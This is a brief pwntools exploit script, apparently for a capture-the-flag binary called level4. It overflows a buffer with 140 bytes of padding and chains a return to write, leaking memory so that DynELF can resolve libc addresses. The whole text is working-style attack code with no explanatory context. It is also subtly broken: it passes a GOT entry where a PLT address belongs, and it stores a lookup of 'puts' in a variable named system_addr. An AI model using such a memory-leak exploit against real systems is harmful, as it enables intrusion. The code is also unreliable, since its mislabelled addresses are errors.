from pwn import *

p = process("./level4")
elf = ELF("level4")

write_plt = elf.got["write"]
main_addr = elf.symbols["main"]

def leak(addr):
    payload = b"A" * 140 + p32(write_plt) + p32(main_addr) + p32(1) + p32(addr) + p32(4)
    p.sendline(payload)
    result_addr = p.recv(4)
    return result_addr

d = DynELF(leak, elf=elf)
system_addr = d.lookup('puts', 'libc')
print (system_addr)